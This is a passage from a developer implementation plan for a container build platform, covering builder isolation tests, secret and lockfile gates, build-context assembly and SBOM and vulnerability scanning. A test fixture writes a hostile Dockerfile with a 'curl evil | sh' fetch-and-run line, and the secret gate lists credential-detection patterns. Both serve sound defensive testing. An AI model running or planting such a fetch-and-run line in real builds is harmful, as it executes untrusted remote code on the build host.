import { DEFAULT_BUILD_LIMITS, runBuildxBuild, withEphemeralBuilder } from './builder.js'

const run = promisify(execFile)
const engine = createEngineClient({ socketPath: resolveSocketPath() })

function context(dockerfile: string): string {
  const dir = mkdtempSync(join(tmpdir(), 'mf-ctx-'))
  writeFileSync(join(dir, 'Dockerfile'), dockerfile)
  return dir
}

const mintFor = async (repository: string): Promise<string> =>
  (await run('node', ['infra/seed/mint-token.mjs', repository])).stdout

describeDocker('the ephemeral rootless builder (§12, D13)', () => {
  afterAll(async () => {
    await run('docker', ['buildx', 'rm', 'mf-builder-t1']).catch(() => undefined)
    await run('docker', ['buildx', 'rm', 'mf-builder-t2']).catch(() => undefined)
  })

  it('is rootless and NOT privileged', async () => {
    await withEphemeralBuilder(engine, 't1', DEFAULT_BUILD_LIMITS, async (name) => {
      const inspect = await engine.get<{
        Config: { User: string }
        HostConfig: { Privileged: boolean; CapAdd: string[] | null }
      }>(`/containers/${name}/json`)
      expect(inspect!.HostConfig.Privileged).toBe(false)
      expect(inspect!.Config.User).toBe('1000:1000')
      const ps = await run('docker', ['exec', name, 'ps', '-o', 'user,comm'])
      expect(ps.stdout).toContain('rootlesskit')
    })
  })

  it('is destroyed even when the build throws — the timeout mechanism', async () => {
    await expect(
      withEphemeralBuilder(engine, 't2', DEFAULT_BUILD_LIMITS, async () => {
        throw new Error('simulated build failure')
      }),
    ).rejects.toThrow('simulated build failure')
    expect(await engine.get('/containers/mf-builder-t2/json')).toBeUndefined()
  })

  it('CANNOT reach the public internet, and CAN reach the mirror', async () => {
    await withEphemeralBuilder(engine, 't1', DEFAULT_BUILD_LIMITS, async (name) => {
      const egress = await run('docker', [
        'exec', name, 'wget', '-q', '-T4', '-O-', 'https://registry.npmjs.org/',
      ]).then(() => 'REACHED', () => 'BLOCKED')
      expect(egress).toBe('BLOCKED')
      const mirror = await run('docker', [
        'exec', name, 'wget', '-q', '-T4', '-O-', 'http://manifest-verdaccio:4873/-/ping',
      ]).then(() => 'REACHED', () => 'BLOCKED')
      expect(mirror).toBe('REACHED')
    })
  })

  it('builds and pushes, and yields a digest', async () => {
    const dir = context(
      'FROM manifest-registry:5000/base/alpine:3.22\nRUN echo built > /proof.txt\n',
    )
    const token = await mintFor('local/buildertest')
    const result = await withEphemeralBuilder(engine, 't1', DEFAULT_BUILD_LIMITS, (name) =>
      runBuildxBuild({
        builder: name,
        contextDir: dir,
        imageRef: 'manifest-registry:5000/local/buildertest:probe',
        registryToken: token,
        registryHost: 'manifest-registry:5000',
        timeoutMs: DEFAULT_BUILD_LIMITS.timeoutMs,
      }),
    )
    expect(result.digest).toMatch(/^sha256:[0-9a-f]{64}$/)
  })

  // The same control as Task 9, through the tool that actually builds. Task 9
  // proved it for `docker push`; this proves it for BuildKit, which pushes by a
  // different code path and fetches its token as a different client_id.
  it('REFUSES to push to a repository the token does not name', async () => {
    const dir = context('FROM manifest-registry:5000/base/alpine:3.22\nRUN true\n')
    const token = await mintFor('local/buildertest')
    await expect(
      withEphemeralBuilder(engine, 't1', DEFAULT_BUILD_LIMITS, (name) =>
        runBuildxBuild({
          builder: name,
          contextDir: dir,
          imageRef: 'manifest-registry:5000/local/not-mine:probe',
          registryToken: token,
          registryHost: 'manifest-registry:5000',
          timeoutMs: DEFAULT_BUILD_LIMITS.timeoutMs,
        }),
      ),
    ).rejects.toThrow(/insufficient_scope|authorization failed/)
  })
})
```

- [ ] **Step 7: Run both tiers**

```bash
pnpm test && pnpm test:docker
```

Expected: 3 concurrency tests, 4 config tests, 5 Docker tests.

- [ ] **Step 8: Prove the network restriction and the `finally`**

First the restriction. Change `NetworkMode: 'manifest-build-internal'` to
`NetworkMode: 'manifest-platform'` and re-run.

Expected: **FAIL** on *"CANNOT reach the public internet"* — the builder reaches
npmjs. This is §20's *"network-restricted builder"* being a control rather than an
aspiration, and S1 found the same thing the same way. Restore it.

Then the bound. Change the `finally` block to a plain trailing statement after
`return await fn(name)` and re-run.

Expected: **FAIL** on *"is destroyed even when the build throws"* — the builder
survives its build. That builder is the runaway `docker rm -f` was going to stop.

- [ ] **Step 9: Confirm the measured bounds are actually in the running daemon**

Not a test — a one-time check that the generated TOML reached the daemon, because a
malformed `buildkitd.toml` is **logged as a warning and otherwise ignored**:

```bash
docker run -d --name mf-builder-manual --network manifest-build-internal \
  --security-opt seccomp=unconfined --security-opt apparmor=unconfined \
  --device /dev/fuse moby/buildkit:v0.32.2-rootless --oci-worker-no-process-sandbox
docker logs mf-builder-manual 2>&1 | grep -iE 'error|invalid|unknown' || echo "config accepted"
docker exec mf-builder-manual buildctl du | tail -1
docker rm -f mf-builder-manual
```

Expected: no configuration errors, and `buildctl du` answering with a total. If the
TOML is malformed the daemon still starts with defaults, so "the builder came up" is
not evidence the bounds are in force.

- [ ] **Step 10: Commit**

```bash
git add packages/control-plane/src/runtime/docker/builder.ts \
        packages/control-plane/src/runtime/docker/concurrency.ts \
        packages/control-plane/src/runtime/docker/builder.test.ts \
        packages/control-plane/src/runtime/docker/concurrency.test.ts \
        packages/control-plane/src/runtime/docker/builder.docker.test.ts
git commit -m "feat(runtime): ephemeral rootless builder with measured bounds

max-parallelism and the GC policy are BuildKit's; the timeout is destroying the
builder, because BuildKit has none; per-project and global concurrency are the
control plane's, because the builder is ephemeral per build."
```

---

## Task 11: `build/` — the context, and the two gates that never degrade offline

**Files:**
- Create: `packages/control-plane/src/build/context.ts`
- Create: `packages/control-plane/src/build/gates.ts`
- Create: `packages/control-plane/src/build/index.ts`
- Test: `packages/control-plane/src/build/gates.test.ts`
- Test: `packages/control-plane/src/build/context.test.ts`

**Interfaces:**
- Consumes: `SourceRef` from `runtime/`; the blueprint registry from `blueprints/` (P2 Task 6).
- Produces:
  - `assembleContext(input: { repoPath; commitSha; blueprintDir; workDir }): Promise<string>`
  - `interface GateFinding { gate: 'secret' | 'lockfile'; severity: 'block'; message: string; path?: string; line?: number }`
  - `scanForSecrets(dir: string): Promise<GateFinding[]>`
  - `requireLockfile(dir: string, blueprint: BlueprintDescriptor): Promise<GateFinding[]>`
  - `runMandatoryGates(dir, blueprint): Promise<GateFinding[]>`
  - `class BuildGateError` with `code = 'BUILD_GATE_FAILED'` and `findings`

**§12: "dependency and secret scanning run as platform-mandatory build gates on every
build — they are not app-declared and cannot be waived by an app."** That sentence is
the reason `build/` is its own module rather than a function inside `releases/`
(*Decisions*, item 6): a gate that lives in the module serving an app's release
request is a gate somebody will eventually add a parameter to.

**These two gates are pattern-based, so they never degrade offline** — §12 says so
explicitly, and it is the difference between them and Task 12's vulnerability scan.
They **block**; nothing about their behaviour changes with the network off.

**D13: the app never supplies a build definition.** `assembleContext` writes the
blueprint's `Dockerfile` and `.npmrc` **after** exporting the app's tree, so an app
that commits its own `Dockerfile` has it overwritten rather than honoured — and a
committed `.npmrc` cannot redirect the build at the public registry. **S1 lost a build
to the ordering of exactly this**: `.npmrc` copied after `npm install` meant the first
build silently used the public npm registry while appearing to succeed, and only
checking the mirror's storage caught it.

- [ ] **Step 1: Write the failing gate test**

`packages/control-plane/src/build/gates.test.ts`:

```ts
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import { requireLockfile, runMandatoryGates, scanForSecrets } from './gates.js'

const blueprint = { lockfile: 'package-lock.json', name: 'fixture-node', version: '1.0.0' }

function fixture(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), 'mf-gate-'))
  for (const [path, body] of Object.entries(files)) {
    const full = join(dir, path)
    mkdirSync(join(full, '..'), { recursive: true })
    writeFileSync(full, body)
  }
  return dir
}

describe('the secret gate (§12, pattern-based, never degrades offline)', () => {
  it('finds an AWS access key id', async () => {
    const findings = await scanForSecrets(fixture({ 'src/app.js': 'const k = "AKIAIOSFODNN7EXAMPLE"' }))
    expect(findings).toHaveLength(1)
    expect(findings[0].gate).toBe('secret')
    expect(findings[0].path).toBe('src/app.js')
    expect(findings[0].line).toBe(1)
  })

  it('finds a private key block and a GitHub token', async () => {
    const dir = fixture({
      'deploy.pem': '-----BEGIN RSA PRIVATE KEY-----\nMIIEow==\n-----END RSA PRIVATE KEY-----\n',
      '.env.local': 'GITHUB_TOKEN=ghp_0123456789abcdefghijklmnopqrstuvwxyz\n',
    })
    const findings = await scanForSecrets(dir)
    expect(findings.map((f) => f.path).sort()).toEqual(['.env.local', 'deploy.pem'])
  })

  it('never reports the message text itself as the secret', async () => {
    const findings = await scanForSecrets(fixture({ 'a.js': 'AKIAIOSFODNN7EXAMPLE' }))
    // §14 redaction at capture: an Event carrying the matched secret would put it
    // straight into the log pipeline the gate exists to keep it out of.
    expect(findings[0].message).not.toContain('AKIAIOSFODNN7EXAMPLE')
  })

  it('passes a clean tree', async () => {
    expect(await scanForSecrets(fixture({ 'src/app.js': 'export const x = 1\n' }))).toEqual([])
  })

  it('skips node_modules, which is neither the app\'s code nor its responsibility', async () => {
    const dir = fixture({ 'node_modules/pkg/k.js': 'AKIAIOSFODNN7EXAMPLE' })
    expect(await scanForSecrets(dir)).toEqual([])
  })
})

describe('the lockfile gate (§12: "committed lockfiles are required; builds fail without one")', () => {
  it('passes when the blueprint\'s lockfile is present', async () => {
    const dir = fixture({ 'package.json': '{}', 'package-lock.json': '{}' })
    expect(await requireLockfile(dir, blueprint)).toEqual([])
  })

  it('blocks when it is missing, and says which file', async () => {
    const findings = await requireLockfile(fixture({ 'package.json': '{}' }), blueprint)
    expect(findings).toHaveLength(1)
    expect(findings[0].gate).toBe('lockfile')
    expect(findings[0].severity).toBe('block')
    expect(findings[0].message).toContain('package-lock.json')
  })
})

describe('the mandatory gate runner', () => {
  it('reports every failing gate at once rather than the first', async () => {
    const dir = fixture({ 'package.json': '{}', 'src/a.js': 'AKIAIOSFODNN7EXAMPLE' })
    const findings = await runMandatoryGates(dir, blueprint)
    expect(findings.map((f) => f.gate).sort()).toEqual(['lockfile', 'secret'])
  })

  // The whole point of §12's sentence. There is no options parameter to add a
  // waiver to, and this test is what stops one being added.
  it('takes no options — a gate an app can waive is not a gate', () => {
    expect(runMandatoryGates.length).toBe(2)
  })
})
```

- [ ] **Step 2: Run it to make sure it fails**

```bash
pnpm --filter @manifest/control-plane test src/build/
```

Expected: FAIL — `Cannot find module './gates.js'`.

- [ ] **Step 3: Write the gates**

`packages/control-plane/src/build/gates.ts`:

```ts
import { readFile, readdir, stat } from 'node:fs/promises'
import { join, relative } from 'node:path'

export interface GateFinding {
  gate: 'secret' | 'lockfile'
  severity: 'block'
  message: string
  path?: string
  line?: number
}

export class BuildGateError extends Error {
  readonly code = 'BUILD_GATE_FAILED'
  constructor(
    readonly findings: GateFinding[],
    readonly hint: string,
  ) {
    super(`build blocked by ${findings.length} mandatory gate finding(s)`)
    this.name = 'BuildGateError'
  }
}

/**
 * Pattern-based, so it works with the network off and never degrades — §12 draws
 * exactly this line between secret/lockfile scanning and vulnerability scanning.
 * Each entry names what it matches; the match itself is NEVER put in the message,
 * because the message becomes an Event and §14 redacts at capture.
 */
const SECRET_PATTERNS: { name: string; pattern: RegExp }[] = [
  { name: 'an AWS access key id', pattern: /\bAKIA[0-9A-Z]{16}\b/ },
  { name: 'a private key block', pattern: /-----BEGIN (?:RSA |EC |OPENSSH |PGP )?PRIVATE KEY-----/ },
  { name: 'a GitHub token', pattern: /\bgh[pousr]_[A-Za-z0-9]{36,}\b/ },
  { name: 'a Slack token', pattern: /\bxox[abposr]-[A-Za-z0-9-]{10,}\b/ },
  { name: 'a Google API key', pattern: /\bAIza[0-9A-Za-z_-]{35}\b/ },
  { name: 'a JSON Web Token', pattern: /\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/ },
  { name: 'a generic assigned secret', pattern: /\b(?:secret|password|passwd|api[_-]?key)\s*[:=]\s*['"][^'"\s]{12,}['"]/i },
]

const SKIP = new Set(['node_modules', '.git', 'dist', 'build', '.next', 'coverage'])

async function* walk(root: string, dir = root): AsyncGenerator<string> {
  for (const entry of await readdir(dir, { withFileTypes: true })) {
    if (SKIP.has(entry.name)) continue
    const full = join(dir, entry.name)
    if (entry.isDirectory()) yield* walk(root, full)
    else if (entry.isFile()) yield full
  }
}

export async function scanForSecrets(dir: string): Promise<GateFinding[]> {
  const findings: GateFinding[] = []
  for await (const file of walk(dir)) {
    // 2 MB: past that it is an asset, not source, and reading it all would make
    // the gate the slowest part of a build.
    if ((await stat(file)).size > 2 * 1024 * 1024) continue
    const text = await readFile(file, 'utf8').catch(() => '')
    const lines = text.split('\n')
    for (const [index, line] of lines.entries()) {
      for (const { name, pattern } of SECRET_PATTERNS) {
        if (!pattern.test(line)) continue
        findings.push({
          gate: 'secret',
          severity: 'block',
          // The matched text is deliberately absent. Putting it here would push
          // the secret into the Event stream this gate exists to protect.
          message: `looks like ${name}`,
          path: relative(dir, file),
          line: index + 1,
        })
        break
      }
    }
  }
  return findings
}

export async function requireLockfile(
  dir: string,
  blueprint: { lockfile: string },
): Promise<GateFinding[]> {
  const exists = await stat(join(dir, blueprint.lockfile)).then(
    () => true,
    () => false,
  )
  return exists
    ? []
    : [
        {
          gate: 'lockfile',
          severity: 'block',
          message:
            `${blueprint.lockfile} is missing. Manifest builds from a committed lockfile so ` +
            'that the dependency set is the one that was reviewed (§12).',
        },
      ]
}

/**
 * Two parameters, and deliberately no third. §12: these gates "are not app-declared
 * and cannot be waived by an app". An options object is where a waiver goes.
 */
export async function runMandatoryGates(
  dir: string,
  blueprint: { lockfile: string },
): Promise<GateFinding[]> {
  const [secrets, lockfile] = await Promise.all([scanForSecrets(dir), requireLockfile(dir, blueprint)])
  return [...secrets, ...lockfile]
}
```

- [ ] **Step 4: Write the context assembly**

`packages/control-plane/src/build/context.ts`:

```ts
import { execFile } from 'node:child_process'
import { copyFile, mkdir } from 'node:fs/promises'
import { join } from 'node:path'
import { promisify } from 'node:util'

const run = promisify(execFile)

export interface ContextInput {
  repoPath: string
  commitSha: string
  /** The blueprint's directory: supplies the Dockerfile and .npmrc (D13). */
  blueprintDir: string
  workDir: string
}

/**
 * D13: the app never supplies a build definition. The blueprint's files are written
 * AFTER the app's tree is exported, so a committed `Dockerfile` is overwritten
 * rather than honoured and a committed `.npmrc` cannot redirect the build at the
 * public npm registry.
 *
 * S1 lost a build to this ordering in the other direction: `.npmrc` copied after
 * `npm install` meant the first build silently used the PUBLIC registry while
 * appearing to succeed, and only inspecting the mirror's storage caught it.
 */
export async function assembleContext(input: ContextInput): Promise<string> {
  const dir = join(input.workDir, 'context')
  await mkdir(dir, { recursive: true })
  // `git archive` reads a bare repository at a commit without a working tree, which
  // is what D5's local driver gives us.
  await run('sh', [
    '-c',
    `git --git-dir=${JSON.stringify(input.repoPath)} archive ${JSON.stringify(input.commitSha)} | tar -x -C ${JSON.stringify(dir)}`,
  ])
  for (const file of ['Dockerfile', '.npmrc', '.dockerignore']) {
    await copyFile(join(input.blueprintDir, file), join(dir, file)).catch((error: NodeJS.ErrnoException) => {
      // Dockerfile is required; the other two are optional per blueprint.
      if (file === 'Dockerfile' || error.code !== 'ENOENT') throw error
    })
  }
  return dir
}
```

- [ ] **Step 5: Write the context test and run both**

`packages/control-plane/src/build/context.test.ts`:

```ts
import { execFileSync } from 'node:child_process'
import { mkdtempSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import { assembleContext } from './context.js'

function bareRepoWith(files: Record<string, string>): { repoPath: string; commitSha: string } {
  const work = mkdtempSync(join(tmpdir(), 'mf-src-'))
  for (const [path, body] of Object.entries(files)) {
    mkdirSync(join(work, path, '..'), { recursive: true })
    writeFileSync(join(work, path), body)
  }
  const env = { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@t', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@t' }
  execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: work, env })
  execFileSync('git', ['add', '-A'], { cwd: work, env })
  execFileSync('git', ['commit', '-qm', 'x'], { cwd: work, env })
  const commitSha = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: work, env }).toString().trim()
  const repoPath = mkdtempSync(join(tmpdir(), 'mf-bare-')) + '/repo.git'
  execFileSync('git', ['clone', '-q', '--bare', work, repoPath], { env })
  return { repoPath, commitSha }
}

describe('build context assembly (D13)', () => {
  it('exports the app tree at a commit from a BARE repository', async () => {
    const { repoPath, commitSha } = bareRepoWith({ 'src/index.js': 'console.log(1)\n' })
    const blueprintDir = mkdtempSync(join(tmpdir(), 'mf-bp-'))
    writeFileSync(join(blueprintDir, 'Dockerfile'), 'FROM base\n')
    const dir = await assembleContext({
      repoPath, commitSha, blueprintDir, workDir: mkdtempSync(join(tmpdir(), 'mf-w-')),
    })
    expect(readFileSync(join(dir, 'src/index.js'), 'utf8')).toContain('console.log(1)')
  })

  // THE CONTROL. An app that commits its own Dockerfile or .npmrc must not be able
  // to change how it is built or where its dependencies come from.
  it('overwrites an app-supplied Dockerfile and .npmrc with the blueprint\'s', async () => {
    const { repoPath, commitSha } = bareRepoWith({
      'Dockerfile': 'FROM attacker/image\nRUN curl evil | sh\n',
      '.npmrc': 'registry=https://registry.npmjs.org/\n',
    })
    const blueprintDir = mkdtempSync(join(tmpdir(), 'mf-bp-'))
    writeFileSync(join(blueprintDir, 'Dockerfile'), 'FROM manifest-registry:5000/base/node\n')
    writeFileSync(join(blueprintDir, '.npmrc'), 'registry=http://manifest-verdaccio:4873/\n')
    const dir = await assembleContext({
      repoPath, commitSha, blueprintDir, workDir: mkdtempSync(join(tmpdir(), 'mf-w-')),
    })
    expect(readFileSync(join(dir, 'Dockerfile'), 'utf8')).not.toContain('attacker')
    expect(readFileSync(join(dir, '.npmrc'), 'utf8')).toContain('manifest-verdaccio')
  })
})
```

```bash
pnpm --filter @manifest/control-plane test src/build/
```

Expected: PASS — 8 gate tests, 2 context tests. No Docker, no network.

- [ ] **Step 6: Prove the ordering is what protects the build**

In `assembleContext`, move the blueprint `copyFile` loop **above** the `git archive`
call.

Expected: **FAIL** on *"overwrites an app-supplied Dockerfile and .npmrc"* — the app's
files win, and the build would run the attacker's Dockerfile against the public npm
registry. Restore the order.

- [ ] **Step 7: Commit**

```bash
git add packages/control-plane/src/build/
git commit -m "feat(build): context assembly and the two platform-mandatory gates

The blueprint's Dockerfile and .npmrc are written after the app's tree, so a
committed one is overwritten rather than honoured (D13). Verified by inverting
the order and watching the app's files win."
```

---

## Task 12: SBOM, vulnerability scanning, and the staleness §12 insists on

**Files:**
- Create: `packages/control-plane/src/build/scan.ts`
- Modify: `infra/images.txt` (`anchore/syft:v1.51.1`, `anchore/grype:v0.118.0`)
- Modify: `infra/seed/seed.sh` (pull the Grype database)
- Create: `infra/scanner/grype.yaml`
- Modify: `scripts/doctor.sh` (report the database age)
- Test: `packages/control-plane/src/build/scan.test.ts`
- Test: `packages/control-plane/src/build/scan.docker.test.ts`

**Interfaces:**
- Consumes: `EngineClient` (Task 1).
- Produces:
  - `interface ScanResult { sbom: string; vulnerabilities: Vulnerability[]; databaseAgeDays: number; stale: boolean; blocked: boolean }`
  - `STALENESS_THRESHOLD_DAYS = 7`
  - `assessScan(input: { databaseAgeDays; vulnerabilities }): { stale: boolean; blocked: boolean; reason: string }`
  - `generateSbom(engine, imageRef): Promise<string>`
  - `scanImage(engine, imageRef): Promise<ScanResult>`

**§12 is unusually specific here, and the specificity is the point:** *"Vulnerability
scanning **warns rather than blocks** when its database is older than 7 days, and the
staleness is recorded on the Release — a local developer is not stopped, and a stale
scan can never be mistaken for a clean one."* Both halves are load-bearing. Blocking
on a stale database would make an offline laptop unable to deploy, which is C1. Not
recording the staleness would let a scan that could not have found anything be read as
a scan that found nothing.

**Versions.** Syft **v1.51.1** and Grype **v0.118.0**, both released 2026-08-27 and
current on that date. Neither is pulled on this machine; both go in `infra/images.txt`
so `make seed` resolves and locks their digests through P1's existing mechanism.

**Why the scanner runs as a container and not as a library.** §21's inventory already
lists *"Scanner + SBOM — transient, per build"*, and P1's self-review deferred it here
with the build path that invokes it. Running it as a container keeps the scanner's
own dependency tree out of the process holding the Docker socket.

- [ ] **Step 1: Write the failing unit test**

`packages/control-plane/src/build/scan.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { STALENESS_THRESHOLD_DAYS, assessScan } from './scan.js'

const critical = [{ id: 'CVE-2026-1', severity: 'Critical' as const, package: 'left-pad' }]

describe('scan assessment (§12)', () => {
  it('blocks on a critical finding with a fresh database', () => {
    const result = assessScan({ databaseAgeDays: 1, vulnerabilities: critical })
    expect(result.blocked).toBe(true)
    expect(result.stale).toBe(false)
  })

  it('passes a clean scan with a fresh database', () => {
    const result = assessScan({ databaseAgeDays: 1, vulnerabilities: [] })
    expect(result.blocked).toBe(false)
    expect(result.stale).toBe(false)
  })

  // The half that keeps C1 true: an offline laptop must still be able to deploy.
  it('WARNS rather than blocks once the database is older than 7 days', () => {
    const result = assessScan({ databaseAgeDays: 8, vulnerabilities: critical })
    expect(result.stale).toBe(true)
    expect(result.blocked).toBe(false)
    expect(result.reason).toContain('8')
  })

  it('puts the threshold at exactly 7 days, not 7-ish', () => {
    expect(STALENESS_THRESHOLD_DAYS).toBe(7)
    expect(assessScan({ databaseAgeDays: 7, vulnerabilities: critical }).blocked).toBe(true)
    expect(assessScan({ databaseAgeDays: 7.01, vulnerabilities: critical }).blocked).toBe(false)
  })

  // The other half: a stale scan must never be READ as a clean one. A clean result
  // from a stale database still carries `stale: true` so the Release records it.
  it('marks a CLEAN scan from a stale database as stale too', () => {
    const result = assessScan({ databaseAgeDays: 30, vulnerabilities: [] })
    expect(result.blocked).toBe(false)
    expect(result.stale).toBe(true)
    expect(result.reason).toMatch(/stale/i)
  })

  it('ignores low and medium severities', () => {
    expect(
      assessScan({
        databaseAgeDays: 1,
        vulnerabilities: [{ id: 'CVE-2026-2', severity: 'Medium', package: 'x' }],
      }).blocked,
    ).toBe(false)
  })
})
```

- [ ] **Step 2: Run it to make sure it fails**

```bash
pnpm --filter @manifest/control-plane test src/build/scan
```

Expected: FAIL — `Cannot find module './scan.js'`.

- [ ] **Step 3: Write the scanner**

`packages/control-plane/src/build/scan.ts`:

```ts
import type { EngineClient } from '../runtime/index.js'

export const STALENESS_THRESHOLD_DAYS = 7
const BLOCKING_SEVERITIES = new Set(['Critical', 'High'])

export interface Vulnerability {
  id: string
  severity: 'Critical' | 'High' | 'Medium' | 'Low' | 'Negligible' | 'Unknown'
  package: string
}

export interface ScanResult {
  sbom: string
  vulnerabilities: Vulnerability[]
  databaseAgeDays: number
  stale: boolean
  blocked: boolean
  reason: string
}

/**
 * §12, both halves. A stale database WARNS instead of blocking, so an offline
 * laptop can still deploy (C1) — and a clean result from a stale database is still
 * marked stale, so it can never be read as evidence there is nothing to find.
 */
export function assessScan(input: {
  databaseAgeDays: number
  vulnerabilities: Vulnerability[]
}): { stale: boolean; blocked: boolean; reason: string } {
  const stale = input.databaseAgeDays > STALENESS_THRESHOLD_DAYS
  const serious = input.vulnerabilities.filter((v) => BLOCKING_SEVERITIES.has(v.severity))
  if (stale) {
    return {
      stale: true,
      blocked: false,
      reason:
        `the vulnerability database is ${input.databaseAgeDays.toFixed(1)} days old ` +
        `(threshold ${STALENESS_THRESHOLD_DAYS}); this scan is STALE and warns rather than blocks. ` +
        `${serious.length} high or critical finding(s) were reported by a database that may not be current.`,
    }
  }
  return {
    stale: false,
    blocked: serious.length > 0,
    reason:
      serious.length > 0
        ? `${serious.length} high or critical finding(s): ${serious.map((v) => `${v.id} (${v.package})`).join(', ')}`
        : 'no high or critical findings',
  }
}
```

The container invocations, in the same file:

```ts
const SYFT = 'anchore/syft:v1.51.1'
const GRYPE = 'anchore/grype:v0.118.0'

/**
 * §12: "an SBOM is produced per build and retained with the Release". Transient
 * containers, per §21's inventory — the scanner's own dependency tree stays out of
 * the process that holds the Docker socket.
 */
export async function generateSbom(engine: EngineClient, imageRef: string): Promise<string> {
  return runScanner(engine, SYFT, [imageRef, '-o', 'spdx-json'])
}

export async function scanImage(engine: EngineClient, imageRef: string): Promise<ScanResult> {
  const sbom = await generateSbom(engine, imageRef)
  const raw = await runScanner(engine, GRYPE, ['--output', 'json', '--fail-on', 'none', imageRef])
  const parsed = JSON.parse(raw) as {
    matches: { vulnerability: { id: string; severity: string }; artifact: { name: string } }[]
    descriptor?: { db?: { built?: string } }
  }
  const vulnerabilities: Vulnerability[] = parsed.matches.map((m) => ({
    id: m.vulnerability.id,
    severity: m.vulnerability.severity as Vulnerability['severity'],
    package: m.artifact.name,
  }))
  // Grype reports its database build date in the descriptor. Absent means we cannot
  // tell how old it is, and "cannot tell" is treated as stale rather than as fresh.
  const built = parsed.descriptor?.db?.built
  const databaseAgeDays =
    built === undefined ? Number.POSITIVE_INFINITY : (Date.now() - Date.parse(built)) / 86_400_000
  const assessed = assessScan({ databaseAgeDays, vulnerabilities })
  return { sbom, vulnerabilities, databaseAgeDays, ...assessed }
}
```

And the runner they share, in the same file:

```ts
import { demux } from '../runtime/index.js'

/**
 * §21's inventory: "Scanner + SBOM — transient, per build". The Docker socket is
 * deliberately NOT mounted (§12 names that as the primary container-escape path),
 * so the scanner reads the image from the registry the same way any client would.
 */
async function runScanner(engine: EngineClient, image: string, args: string[]): Promise<string> {
  const created = await engine.post<{ Id: string }>('/containers/create', {
    Image: image,
    Cmd: args,
    Env: ['GRYPE_DB_AUTO_UPDATE=false', 'GRYPE_DB_CACHE_DIR=/db'],
    HostConfig: {
      NetworkMode: 'manifest-platform',
      Binds: ['manifest-grype-db:/db:ro'],
      CapDrop: ['ALL'],
      SecurityOpt: ['no-new-privileges'],
      Privileged: false,
      Memory: 1024 * 1024 * 1024,
      RestartPolicy: { Name: 'no' },
    },
  })
  const id = created!.Id
  try {
    await engine.post(`/containers/${id}/start`)
    const wait = await engine.post<{ StatusCode: number }>(`/containers/${id}/wait`)
    // stdout ONLY. Syft and Grype write progress to stderr, and mixing the two
    // produces JSON that does not parse — with an error that blames the parser.
    const stream = await engine.stream(`/containers/${id}/logs?stdout=true`)
    let out = ''
    for await (const line of demux(stream as unknown as AsyncIterable<Buffer>)) {
      if (line.stream === 'stdout') out += line.text + '\n'
    }
    if ((wait?.StatusCode ?? 1) !== 0) {
      throw new Error(`scanner ${image} exited ${wait?.StatusCode}: ${out.slice(0, 400)}`)
    }
    return out
  } finally {
    await engine.del(`/containers/${id}?force=true&v=true`)
  }
}
```

`GRYPE_DB_AUTO_UPDATE=false` is load-bearing: without it Grype tries to fetch a
database on every run, which turns an **offline** build into a slow failure rather
than a stale-but-recorded success — the exact behaviour §12 spends a paragraph
forbidding. `make seed` populates `manifest-grype-db`, and the bind is read-only.

- [ ] **Step 4: Seed the scanner and report its age**

`infra/images.txt` gains:

```
anchore/syft:v1.51.1
anchore/grype:v0.118.0
```

`infra/seed/seed.sh` gains, after the image pulls:

```bash
# §12: `make seed` pulls the scanner database. This is the only part of the scan
# that needs network, and `make doctor` reports its age from here on.
docker volume create manifest-grype-db >/dev/null
docker run --rm -v manifest-grype-db:/db \
  -e GRYPE_DB_CACHE_DIR=/db anchore/grype:v0.118.0 db update
```

`scripts/doctor.sh` gains a **warning**, not a check — a stale database must not stop
a developer:

```bash
scanner_db_age() {
  local built age
  built=$(docker run --rm -v manifest-grype-db:/db alpine:3.22 \
          sh -c 'cat /db/*/metadata.json 2>/dev/null' \
          | sed -n 's/.*"built":"\([^"]*\)".*/\1/p' | head -1)
  if [ -z "$built" ]; then
    echo "no vulnerability database — run 'make seed' with network"
    return 1
  fi
  # BSD date. No -d, no --date; %s from a parsed ISO-8601 string instead.
  age=$(( ( $(date +%s) - $(date -j -f '%Y-%m-%dT%H:%M:%SZ' "${built%%.*}Z" +%s 2>/dev/null || echo 0) ) / 86400 ))
  echo "vulnerability database is ${age} days old (warns above 7, never blocks)"
  [ "$age" -le 7 ]
}
check_warn "the vulnerability database is fresh"  scanner_db_age
```

- [ ] **Step 5: Write the Docker-tier test**

`packages/control-plane/src/build/scan.docker.test.ts` — scan `alpine:3.22`, assert
the SBOM parses as SPDX JSON and names at least one package, and assert
`databaseAgeDays` is a finite number. **Assert the shape of the answer, not that an
answer arrived**: an SBOM with zero packages is a scanner that ran and found nothing,
which is the failure mode this tier exists to catch.

```ts
import { expect, it } from 'vitest'
import { createEngineClient, resolveSocketPath } from '../runtime/index.js'
import { describeDocker } from '../runtime/docker/docker-tier.js'
import { scanImage } from './scan.js'

const engine = createEngineClient({ socketPath: resolveSocketPath() })

describeDocker('SBOM and vulnerability scanning (§12)', () => {
  it('produces an SBOM that actually lists packages', async () => {
    const result = await scanImage(engine, 'alpine:3.22')
    const sbom = JSON.parse(result.sbom) as { packages?: unknown[]; spdxVersion?: string }
    expect(sbom.spdxVersion).toMatch(/^SPDX-/)
    // The assertion that matters: "it returned an SBOM" and "it returned an SBOM of
    // this image" are different claims. Alpine has dozens of packages.
    expect(sbom.packages?.length ?? 0).toBeGreaterThan(5)
  })

  it('reports a database age, and treats an unknown age as stale', async () => {
    const result = await scanImage(engine, 'alpine:3.22')
    expect(Number.isNaN(result.databaseAgeDays)).toBe(false)
    if (!Number.isFinite(result.databaseAgeDays)) expect(result.stale).toBe(true)
  })
})
```

- [ ] **Step 6: Run both tiers**

```bash
make seed && pnpm test && pnpm test:docker && make doctor
```

Expected: 6 unit tests, 2 Docker tests, and `make doctor` printing the database age as
a warning line rather than a failure.

- [ ] **Step 7: Prove the staleness rule both ways**

Change `const stale = input.databaseAgeDays > STALENESS_THRESHOLD_DAYS` to
